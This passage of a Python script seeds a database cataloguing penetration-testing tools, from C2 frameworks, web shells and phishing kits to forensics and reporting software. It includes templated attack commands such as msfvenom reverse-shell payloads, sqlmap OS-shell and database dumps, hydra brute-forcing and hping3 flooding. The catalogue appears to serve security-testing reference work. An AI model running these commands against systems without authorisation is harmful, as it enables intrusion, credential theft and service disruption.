    ("powerview", "post-exploitation", "active-directory", "AD recon PowerShell", "PowerView.ps1", "git clone", "intermediate", "high", 0, "windows", None, "https://github.com/PowerShellMafia/PowerSploit", None, 0),
    ("rubeus", "post-exploitation", "active-directory", "Kerberos abuse toolkit", "Rubeus.exe", "Binary", "advanced", "low", 0, "windows", None, "https://github.com/GhostPack/Rubeus", None, 0),
    ("mimikatz", "post-exploitation", "active-directory", "Windows credential extraction", "mimikatz.exe", "Binary", "intermediate", "low", 0, "windows", None, "https://github.com/gentilkiwi/mimikatz", None, 0),
    
    ("impacket", "post-exploitation", "network", "Python network protocol toolkit", "python3 -m impacket", "apt install python3-impacket", "intermediate", "medium", 0, "linux", "python3-impacket", "https://github.com/SecureAuthCorp/impacket", None, 1),
    ("psexec", "post-exploitation", "lateral-movement", "Remote execution", "psexec.py {user}@{target}", "apt install python3-impacket", "intermediate", "low", 0, "linux", "python3-impacket", None, None, 1),
    ("wmiexec", "post-exploitation", "lateral-movement", "WMI execution", "wmiexec.py {user}@{target}", "apt install python3-impacket", "intermediate", "low", 0, "linux", "python3-impacket", None, None, 1),
    ("smbexec", "post-exploitation", "lateral-movement", "SMB execution", "smbexec.py {user}@{target}", "apt install python3-impacket", "intermediate", "low", 0, "linux", "python3-impacket", None, None, 1),
    
    ("evil-winrm", "post-exploitation", "windows", "WinRM pentesting tool", "evil-winrm -i {target} -u {user} -p {pass}", "gem install evil-winrm", "beginner", "medium", 0, "linux", None, "https://github.com/Hackplayers/evil-winrm", None, 0),
    
    ("netcat", "post-exploitation", "shell", "TCP/UDP swiss army knife", "nc -lvnp {port}", "apt install netcat", "beginner", "high", 0, "linux", "netcat", None, None, 1),
    ("socat", "post-exploitation", "shell", "Multipurpose relay tool", "socat TCP-LISTEN:{port} -", "apt install socat", "intermediate", "high", 0, "linux", "socat", None, None, 1),
    ("pwncat", "post-exploitation", "shell", "Post-exploitation framework", "pwncat-cs -lp {port}", "pip3 install pwncat-cs", "intermediate", "medium", 0, "linux", None, "https://github.com/calebstewart/pwncat", None, 0),
    
    # MAINTAINING ACCESS (10+ tools)
    ("weevely", "maintaining-access", "backdoor", "Web shell generator", "weevely generate {password} {output.php}", "apt install weevely", "intermediate", "low", 0, "linux", "weevely", None, None, 1),
    ("webshell", "maintaining-access", "backdoor", "Collection of web shells", None, "git clone", "intermediate", "low", 0, "cross-platform", None, "https://github.com/tennc/webshell", None, 0),
    
    ("persistence", "maintaining-access", "persistence", "Persistence scripts collection", None, "git clone", "advanced", "low", 0, "cross-platform", None, None, None, 0),
    
    ("meterpreter", "maintaining-access", "payload", "Metasploit advanced payload", "msfconsole", "apt install metasploit-framework", "intermediate", "low", 0, "linux", "metasploit-framework", None, None, 1),
    
    ("empire-agent", "maintaining-access", "c2", "Empire C2 agent", None, "git clone", "advanced", "low", 0, "cross-platform", None, "https://github.com/BC-SECURITY/Empire", None, 0),
    ("covenant", "maintaining-access", "c2", ".NET C2 framework", None, "git clone", "advanced", "low", 0, "windows", None, "https://github.com/cobbr/Covenant", None, 0),
    ("sliver", "maintaining-access", "c2", "Modern C2 framework", "sliver-server", "Binary", "advanced", "low", 0, "linux", None, "https://github.com/BishopFox/sliver", None, 0),
    
    ("proxychains", "maintaining-access", "pivoting", "Proxy tunneling tool", "proxychains {command}", "apt install proxychains4", "intermediate", "high", 0, "linux", "proxychains4", None, None, 1),
    ("chisel", "maintaining-access", "pivoting", "Fast TCP/UDP tunnel", "chisel server -p {port}", "apt install chisel", "intermediate", "medium", 0, "linux", "chisel", "https://github.com/jpillora/chisel", None, 1),
    ("ligolo", "maintaining-access", "pivoting", "Tunneling tool", "ligolo", "Binary", "intermediate", "medium", 0, "linux", None, "https://github.com/sysdream/ligolo", None, 0),
    ("sshuttle", "maintaining-access", "pivoting", "VPN over SSH", "sshuttle -r {user}@{host} {network}", "apt install sshuttle", "beginner", "high", 0, "linux", "sshuttle", None, None, 1),
    
    # REVERSE ENGINEERING (15+ tools)
    ("ghidra", "reverse-engineering", "disassembler", "NSA reverse engineering tool", "ghidra", "apt install ghidra", "advanced", "high", 0, "linux", "ghidra", None, None, 1),
    ("ida-free", "reverse-engineering", "disassembler", "Interactive disassembler", None, "Commercial/Free", "advanced", "high", 0, "cross-platform", None, None, "https://hex-rays.com", 0),
    ("radare2", "reverse-engineering", "disassembler", "Reverse engineering framework", "r2 {binary}", "apt install radare2", "advanced", "high", 0, "linux", "radare2", None, None, 1),
    ("cutter", "reverse-engineering", "disassembler", "Radare2 GUI", "cutter", "apt install cutter", "intermediate", "high", 0, "linux", "cutter", None, None, 1),
    ("binary-ninja", "reverse-engineering", "disassembler", "Binary analysis platform", None, "Commercial", "advanced", "high", 0, "cross-platform", None, None, "https://binary.ninja", 0),
    
    ("gdb", "reverse-engineering", "debugger", "GNU debugger", "gdb {binary}", "apt install gdb", "advanced", "high", 0, "linux", "gdb", None, None, 1),
    ("pwndbg", "reverse-engineering", "debugger", "GDB plugin for exploit dev", "gdb -x pwndbg", "git clone", "advanced", "high", 0, "linux", None, "https://github.com/pwndbg/pwndbg", None, 0),
    ("gef", "reverse-engineering", "debugger", "GDB enhanced features", "gdb -x gef", "git clone", "advanced", "high", 0, "linux", None, "https://github.com/hugsy/gef", None, 0),
    ("edb", "reverse-engineering", "debugger", "Evans debugger", "edb", "apt install edb-debugger", "advanced", "high", 0, "linux", "edb-debugger", None, None, 1),
    
    ("strings", "reverse-engineering", "analysis", "Extract printable strings", "strings {binary}", "apt install binutils", "beginner", "high", 0, "linux", "binutils", None, None, 1),
    ("binwalk", "reverse-engineering", "analysis", "Firmware analysis tool", "binwalk {firmware}", "apt install binwalk", "intermediate", "high", 0, "linux", "binwalk", None, None, 1),
    ("strace", "reverse-engineering", "analysis", "System call tracer", "strace {binary}", "apt install strace", "intermediate", "high", 0, "linux", "strace", None, None, 1),
    ("ltrace", "reverse-engineering", "analysis", "Library call tracer", "ltrace {binary}", "apt install ltrace", "intermediate", "high", 0, "linux", "ltrace", None, None, 1),
    ("objdump", "reverse-engineering", "analysis", "Object file dumper", "objdump -d {binary}", "apt install binutils", "intermediate", "high", 0, "linux", "binutils", None, None, 1),
    ("nm", "reverse-engineering", "analysis", "Symbol table viewer", "nm {binary}", "apt install binutils", "beginner", "high", 0, "linux", "binutils", None, None, 1),
    
    # FORENSICS (15+ tools)
    ("autopsy", "forensics", "disk", "Digital forensics platform", "autopsy", "apt install autopsy", "intermediate", "high", 0, "linux", "autopsy", None, None, 1),
    ("sleuthkit", "forensics", "disk", "Forensic analysis tools", "fls {image}", "apt install sleuthkit", "intermediate", "high", 0, "linux", "sleuthkit", None, None, 1),
    ("volatility", "forensics", "memory", "Memory forensics framework", "vol.py -f {dump}", "apt install volatility", "advanced", "high", 0, "linux", "volatility", None, None, 1),
    ("rekall", "forensics", "memory", "Memory forensics framework", "rekall -f {dump}", "pip3 install rekall", "advanced", "high", 0, "linux", None, "https://github.com/google/rekall", None, 0),
    
    ("exiftool", "forensics", "metadata", "Metadata reader/writer", "exiftool {file}", "apt install libimage-exiftool-perl", "beginner", "high", 0, "linux", "libimage-exiftool-perl", None, None, 1),
    ("foremost", "forensics", "recovery", "File recovery tool", "foremost -i {image}", "apt install foremost", "beginner", "high", 0, "linux", "foremost", None, None, 1),
    ("scalpel", "forensics", "recovery", "File carving tool", "scalpel {image}", "apt install scalpel", "beginner", "high", 0, "linux", "scalpel", None, None, 1),
    ("photorec", "forensics", "recovery", "File recovery utility", "photorec {device}", "apt install testdisk", "beginner", "high", 0, "linux", "testdisk", None, None, 1),
    
    ("chkrootkit", "forensics", "rootkit", "Rootkit detection", "chkrootkit", "apt install chkrootkit", "beginner", "high", 1, "linux", "chkrootkit", None, None, 1),
    ("unhide", "forensics", "rootkit", "Hidden process/port finder", "unhide proc", "apt install unhide", "beginner", "high", 1, "linux", "unhide", None, None, 1),
    
    ("bulk_extractor", "forensics", "extraction", "Digital evidence extraction", "bulk_extractor -o {outdir} {image}", "apt install bulk-extractor", "intermediate", "high", 0, "linux", "bulk-extractor", None, None, 1),
    
    # REPORTING (10+ tools)
    ("dradis", "reporting", "collaboration", "Collaboration and reporting platform", "dradis-webapp", "gem install dradis-ce", "intermediate", "high", 0, "linux", None, None, "https://dradisframework.com", 0),
    ("faraday", "reporting", "collaboration", "Collaborative penetration test IDE", "faraday-server", "pip3 install faraday-agent-dispatcher", "intermediate", "high", 0, "linux", None, "https://github.com/infobyte/faraday", None, 0),
    ("serpico", "reporting", "documentation", "Penetration testing report generator", None, "git clone", "beginner", "high", 0, "linux", None, "https://github.com/SerpicoProject/Serpico", None, 0),
    ("pipal", "reporting", "password-analysis", "Password analysis tool", "pipal {passfile}", "git clone", "beginner", "high", 0, "linux", None, "https://github.com/digininja/pipal", None, 0),
    
    ("cherrytree", "reporting", "notes", "Hierarchical note-taking", "cherrytree", "apt install cherrytree", "beginner", "high", 0, "linux", "cherrytree", None, None, 1),
    ("keepnote", "reporting", "notes", "Note-taking application", "keepnote", "apt install keepnote", "beginner", "high", 0, "linux", "keepnote", None, None, 1),
    ("obsidian", "reporting", "notes", "Knowledge base tool", None, "Binary", "beginner", "high", 0, "cross-platform", None, None, "https://obsidian.md", 0),
    
    ("recordmydesktop", "reporting", "screen-recording", "Desktop recorder", "recordmydesktop", "apt install recordmydesktop", "beginner", "high", 0, "linux", "recordmydesktop", None, None, 1),
    ("asciinema", "reporting", "terminal-recording", "Terminal session recorder", "asciinema rec", "apt install asciinema", "beginner", "high", 0, "linux", "asciinema", None, None, 1),
    
    # SOCIAL ENGINEERING (10+ tools)
    ("setoolkit", "social-engineering", "framework", "Social engineering toolkit", "setoolkit", "apt install set", "beginner", "low", 0, "linux", "set", None, None, 1),
    ("gophish", "social-engineering", "phishing", "Phishing framework", "gophish", "Binary", "beginner", "low", 0, "linux", None, "https://github.com/gophish/gophish", None, 0),
    ("king-phisher", "social-engineering", "phishing", "Phishing campaign toolkit", "king-phisher", "git clone", "intermediate", "low", 0, "linux", None, "https://github.com/rsmusllp/king-phisher", None, 0),
    ("modlishka", "social-engineering", "phishing", "Reverse proxy phishing", "modlishka", "Binary", "advanced", "low", 0, "linux", None, "https://github.com/drk1wi/Modlishka", None, 0),
    ("evilginx2", "social-engineering", "phishing", "MitM phishing framework", "evilginx2", "Binary", "advanced", "low", 0, "linux", None, "https://github.com/kgretzky/evilginx2", None, 0),
    
    ("maltego", "social-engineering", "osint", "Link analysis tool", "maltego", "apt install maltego", "intermediate", "high", 0, "linux", "maltego", None, None, 1),
    
    # STRESS TESTING (5+ tools)
    ("slowloris", "stress-testing", "dos", "Low-bandwidth DoS tool", "slowloris {target}", "git clone", "beginner", "low", 0, "linux", None, "https://github.com/gkbrk/slowloris", None, 0),
    ("hping3", "stress-testing", "dos", "Packet crafting/flooding", "hping3 -S --flood {target}", "apt install hping3", "intermediate", "low", 1, "linux", "hping3", None, None, 1),
    ("goldeneye", "stress-testing", "dos", "HTTP DoS tool", "goldeneye.py {url}", "git clone", "beginner", "low", 0, "linux", None, "https://github.com/jseidl/GoldenEye", None, 0),
    ("siege", "stress-testing", "http", "HTTP load tester", "siege {url}", "apt install siege", "beginner", "high", 0, "linux", "siege", None, None, 1),
    ("ab", "stress-testing", "http", "Apache benchmark", "ab -n {requests} -c {concurrency} {url}", "apt install apache2-utils", "beginner", "high", 0, "linux", "apache2-utils", None, None, 1),
]

# Tags to apply
TAGS_DATA = [
    ("active", "behavior", "#FF5722", "Actively interacts with target"),
    ("passive", "behavior", "#4CAF50", "Passive reconnaissance only"),
    ("noisy", "behavior", "#F44336", "Generates significant traffic/logs"),
    ("stealth", "behavior", "#9E9E9E", "Low detection signature"),
    ("automated", "workflow", "#2196F3", "Can be fully automated"),
    ("manual", "workflow", "#FFC107", "Requires manual operation"),
    ("gui", "interface", "#673AB7", "Graphical interface available"),
    ("cli", "interface", "#00BCD4", "Command-line only"),
    ("windows", "platform", "#0078D4", "Windows platform"),
    ("linux", "platform", "#FCC624", "Linux platform"),
    ("network", "target", "#009688", "Network-level tool"),
    ("web", "target", "#FF9800", "Web application focused"),
    ("wireless", "target", "#3F51B5", "Wireless attacks"),
    ("kali-default", "distribution", "#367BF5", "Installed by default in Kali"),
    ("commercial", "license", "#E91E63", "Commercial/paid tool"),
    ("open-source", "license", "#8BC34A", "Open-source tool"),
]


def seed_tools(db_path=DB_FILE):
    """Seed the tools database with comprehensive data"""
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    
    print("[*] Seeding tools database...")
    
    # Insert tags
    print(f"[*] Inserting {len(TAGS_DATA)} tags...")
    for tag_data in TAGS_DATA:
        cursor.execute("""
            INSERT OR IGNORE INTO tags (name, category, color, description)
            VALUES (?, ?, ?, ?)
        """, tag_data)
    
    # Insert tools
    print(f"[*] Inserting {len(TOOLS_DATA)} tools...")
    tool_count = 0
    for tool_data in TOOLS_DATA:
        try:
            cursor.execute("""
                INSERT OR IGNORE INTO tools 
                (name, category, subcategory, description, command_template, 
                 install_method, difficulty, stealth_level, requires_root, 
                 platform, package_name, github_url, official_url, kali_installed)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, tool_data)
            if cursor.rowcount > 0:
                tool_count += 1
        except sqlite3.IntegrityError:
            continue
    
    print(f"[+] Inserted {tool_count} tools")
    
    # Auto-tag tools
    print("[*] Auto-tagging tools...")
    
    # Kali-installed tools
    cursor.execute("""
        INSERT INTO tool_tags (tool_id, tag_id)
        SELECT t.id, tg.id FROM tools t, tags tg
        WHERE t.kali_installed = 1 AND tg.name = 'kali-default'
        AND NOT EXISTS (
            SELECT 1 FROM tool_tags tt 
            WHERE tt.tool_id = t.id AND tt.tag_id = tg.id
        )
    """)
    
    # Platform tags
    for platform in ['windows', 'linux']:
        cursor.execute(f"""
            INSERT INTO tool_tags (tool_id, tag_id)
            SELECT t.id, tg.id FROM tools t, tags tg
            WHERE t.platform = '{platform}' AND tg.name = '{platform}'
            AND NOT EXISTS (
                SELECT 1 FROM tool_tags tt 
                WHERE tt.tool_id = t.id AND tt.tag_id = tg.id
            )
        """)
    
    # Web-focused tools
    cursor.execute("""
        INSERT INTO tool_tags (tool_id, tag_id)
        SELECT t.id, tg.id FROM tools t, tags tg
        WHERE (t.category = 'web-applications' OR t.subcategory LIKE '%web%') 
        AND tg.name = 'web'
        AND NOT EXISTS (
            SELECT 1 FROM tool_tags tt 
            WHERE tt.tool_id = t.id AND tt.tag_id = tg.id
        )
    """)
    
    # Network tools
    cursor.execute("""
        INSERT INTO tool_tags (tool_id, tag_id)
        SELECT t.id, tg.id FROM tools t, tags tg
        WHERE (t.category IN ('reconnaissance', 'sniffing') 
               OR t.subcategory LIKE '%network%')
        AND tg.name = 'network'
        AND NOT EXISTS (
            SELECT 1 FROM tool_tags tt 
            WHERE tt.tool_id = t.id AND tt.tag_id = tg.id
        )
    """)
    
    # Add example commands for popular tools
    print("[*] Adding usage examples...")
    
    examples = [
        # nmap examples
        ("nmap", "Quick scan", "nmap -sV -sC {target}", "Version detection with default scripts", "reconnaissance", "beginner", 1, 0),
        ("nmap", "Full TCP scan", "nmap -p- -T4 {target}", "Scan all 65535 TCP ports", "full-scan", "intermediate", 1, 0),
        ("nmap", "UDP scan", "nmap -sU --top-ports 100 {target}", "Scan top 100 UDP ports", "service-discovery", "intermediate", 1, 1),
        ("nmap", "Stealth scan", "nmap -sS -T2 -f {target}", "SYN scan with slow timing and fragmentation", "evasion", "advanced", 1, 1),
        
        # gobuster examples
        ("gobuster", "Directory scan", "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt", "Basic directory enumeration", "web-recon", "beginner", 1, 0),
        ("gobuster", "DNS subdomain scan", "gobuster dns -d {domain} -w /usr/share/wordlists/subdomains.txt", "Subdomain enumeration", "dns-recon", "beginner", 1, 0),
        ("gobuster", "Vhost scan", "gobuster vhost -u http://{target} -w /usr/share/wordlists/vhosts.txt", "Virtual host discovery", "web-recon", "intermediate", 1, 0),
        
        # hydra examples
        ("hydra", "SSH brute-force", "hydra -L users.txt -P passwords.txt ssh://{target}", "SSH login brute-force", "credential-attack", "intermediate", 1, 0),
        ("hydra", "HTTP POST login", "hydra -l admin -P passwords.txt {target} http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'", "Web form brute-force", "web-attack", "advanced", 1, 0),
        
        # sqlmap examples
        ("sqlmap", "Basic injection test", "sqlmap -u 'http://{target}/page?id=1' --batch", "Automated SQL injection detection", "web-attack", "beginner", 1, 0),
        ("sqlmap", "Database dump", "sqlmap -u 'http://{target}/page?id=1' --dump --batch", "Extract database contents", "data-extraction", "intermediate", 1, 0),
        ("sqlmap", "OS shell", "sqlmap -u 'http://{target}/page?id=1' --os-shell --batch", "Attempt to get OS command shell", "exploitation", "advanced", 1, 0),
        
        # metasploit examples
        ("msfconsole", "Search exploits", "msfconsole -q -x 'search {service}'", "Search for exploits for a service", "exploit-search", "beginner", 0, 0),
        ("msfvenom", "Linux reverse shell", "msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf > shell.elf", "Generate Linux reverse shell binary", "payload-generation", "intermediate", 0, 0),
        ("msfvenom", "Windows reverse shell", "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe > shell.exe", "Generate Windows Meterpreter payload", "payload-generation", "intermediate", 0, 0),
        
        # hashcat examples
        ("hashcat", "MD5 dictionary", "hashcat -m 0 -a 0 hashes.txt wordlist.txt", "Crack MD5 hashes with wordlist", "password-cracking", "beginner", 0, 0),
        ("hashcat", "NTLM with rules", "hashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r best64.rule", "Crack NTLM with ruleset", "password-cracking", "intermediate", 0, 0),
    ]
    
    example_count = 0
    for ex_tool, title, cmd, desc, use_case, difficulty, requires_target, sudo_req in examples:
        cursor.execute("SELECT id FROM tools WHERE name = ?", (ex_tool,))
        result = cursor.fetchone()
        if result:
            tool_id = result[0]
            cursor.execute("""
                INSERT INTO tool_examples 
                (tool_id, title, command, description, use_case, difficulty, requires_target, sudo_required)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            """, (tool_id, title, cmd, desc, use_case, difficulty, requires_target, sudo_req))
            example_count += 1
    
    print(f"[+] Added {example_count} usage examples")
    
    conn.commit()
    
    # Stats
    cursor.execute("SELECT COUNT(*) FROM tools")
    total_tools = cursor.fetchone()[0]
    
    cursor.execute("SELECT COUNT(*) FROM tags")
    total_tags = cursor.fetchone()[0]
    
    cursor.execute("SELECT COUNT(*) FROM tool_examples")
    total_examples = cursor.fetchone()[0]
    
    cursor.execute("SELECT category, COUNT(*) FROM tools GROUP BY category ORDER BY COUNT(*) DESC")
    categories = cursor.fetchall()
    
    conn.close()
    
    print("\n" + "="*60)
    print("DATABASE SEEDING COMPLETE")
    print("="*60)
    print(f"Total tools:     {total_tools}")
    print(f"Total tags:      {total_tags}")
    print(f"Total examples:  {total_examples}")
    print("\nTools by category:")
    for cat, count in categories:
        print(f"  {cat:25s} {count:3d} tools")
    print("="*60)


if __name__ == "__main__":
    seed_tools()
